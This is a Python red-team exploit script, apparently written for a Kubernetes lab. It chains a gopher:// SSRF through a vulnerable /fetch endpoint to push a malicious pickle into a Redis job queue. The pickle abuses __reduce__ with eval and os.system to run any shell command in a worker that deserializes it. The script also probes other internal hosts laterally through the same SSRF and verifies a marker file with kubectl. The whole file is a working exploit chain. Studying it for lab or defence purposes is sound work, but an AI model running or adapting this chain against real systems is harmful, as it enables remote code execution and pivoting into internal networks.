import argparse
import pickle
import subprocess
import urllib.parse

import requests


# Pickle payload that runs a shell command when deserialized by a vulnerable worker.
class RCEPayload:
    def __init__(self, command: str):
        self.command = command

    def __reduce__(self):
        # __reduce__ controls how pickle rebuilds the object; we abuse it for RCE.
        expression = f"__import__('os').system({self.command!r})"
        return (eval, (expression,))


def build_resp_command(parts: list[bytes]) -> bytes:
    # Encode a raw Redis command using the RESP protocol for LPUSH/LLEN.
    frame = [f"*{len(parts)}\r\n".encode("utf-8")]
    for part in parts:
        frame.append(f"${len(part)}\r\n".encode("utf-8"))
        frame.append(part)
        frame.append(b"\r\n")
    return b"".join(frame)


def send_raw_via_ssrf(web_base_url: str, host: str, port: int, payload: bytes) -> requests.Response:
    # Abuse SSRF + gopher to send raw bytes through the vulnerable /fetch endpoint.
    gopher_url = (
        f"gopher://{host}:{port}/_"
        f"{urllib.parse.quote_from_bytes(payload, safe='')}"
    )
    return requests.get(
        f"{web_base_url.rstrip('/')}/fetch",
        params={"url": gopher_url},
        timeout=10,
    )


def send_redis_via_ssrf(web_base_url: str, redis_host: str, redis_port: int, command: bytes) -> requests.Response:
    return send_raw_via_ssrf(web_base_url, redis_host, redis_port, command)


def build_http_request(host: str, path: str) -> bytes:
    normalized_path = path if path.startswith("/") else f"/{path}"
    request_lines = (
        f"GET {normalized_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: red-team-blast\r\n"
        "Connection: close\r\n\r\n"
    )
    return request_lines.encode("utf-8")


def verify_marker_with_kubectl(namespace: str, marker_path: str) -> tuple[bool, str]:
    # Optional verification: read the marker file from the vulnerable worker pod.
    result = subprocess.run(
        [
            "kubectl",
            "-n",
            namespace,
            "exec",
            "deploy/worker-vulnerable",
            "--",
            "cat",
            marker_path,
        ],
        capture_output=True,
        text=True,
        check=False,
    )

    if result.returncode != 0:
        return False, result.stderr.strip() or result.stdout.strip()
    return True, result.stdout.strip()


def main() -> None:
    parser = argparse.ArgumentParser(description="Red team attack: SSRF -> Redis poison -> pickle RCE")
    parser.add_argument("--web-base-url", default="http://localhost:5000", help="Vulnerable web URL")
    parser.add_argument("--redis-host", default="redis", help="Redis host visible from web pod")
    parser.add_argument("--redis-port", type=int, default=6379)
    parser.add_argument("--queue", default="mail_jobs_vuln", help="Target Redis queue")
    parser.add_argument(
        "--rce-command",
        default="sh -c 'echo REDTEAM_OWNED > /tmp/redteam_owned.txt'",
        help="Command executed inside vulnerable worker",
    )
    parser.add_argument("--verify-k8s", action="store_true", help="Check marker file in worker-vulnerable pod")
    parser.add_argument("--namespace", default="redis-injection-lab")
    parser.add_argument("--marker-path", default="/tmp/redteam_owned.txt")
    parser.add_argument("--blast-host", default="", help="Optional lateral blast target host (k8s service)")
    parser.add_argument("--blast-port", type=int, default=8080)
    parser.add_argument("--blast-path", default="/")
    parser.add_argument("--blast-only", action="store_true", help="Only run lateral blast probe")
    args = parser.parse_args()

    if args.blast_only and not args.blast_host:
        parser.error("--blast-only requires --blast-host")

    if not args.blast_only:
        # Attacker-controlled pickle; unsafe deserialization in the worker triggers the command.
        malicious_pickle = pickle.dumps(RCEPayload(args.rce_command), protocol=4)
        lpush_command = build_resp_command([b"LPUSH", args.queue.encode("utf-8"), malicious_pickle])

        response = send_redis_via_ssrf(
            web_base_url=args.web_base_url,
            redis_host=args.redis_host,
            redis_port=args.redis_port,
            command=lpush_command,
        )

        print("[red-team] SSRF request status:", response.status_code)
        print("[red-team] SSRF response body:", response.text)

        # Basic signal that the queue was poisoned.
        llen_command = build_resp_command([b"LLEN", args.queue.encode("utf-8")])
        llen_response = send_redis_via_ssrf(
            web_base_url=args.web_base_url,
            redis_host=args.redis_host,
            redis_port=args.redis_port,
            command=llen_command,
        )
        print("[red-team] Queue depth query status:", llen_response.status_code)
        print("[red-team] Queue depth query body:", llen_response.text)
    elif args.verify_k8s:
        print("[red-team] --verify-k8s ignored in --blast-only mode")

    if args.blast_host:
        blast_request = build_http_request(args.blast_host, args.blast_path)
        blast_response = send_raw_via_ssrf(
            web_base_url=args.web_base_url,
            host=args.blast_host,
            port=args.blast_port,
            payload=blast_request,
        )
        print("[red-team] Blast probe status:", blast_response.status_code)
        print("[red-team] Blast probe body:", blast_response.text)

    if args.verify_k8s and not args.blast_only:
        ok, output = verify_marker_with_kubectl(args.namespace, args.marker_path)
        if ok:
            print(f"[red-team] Marker file detected at {args.marker_path}: {output}")
        else:
            print("[red-team] Could not verify marker via kubectl:", output)


if __name__ == "__main__":
    main()
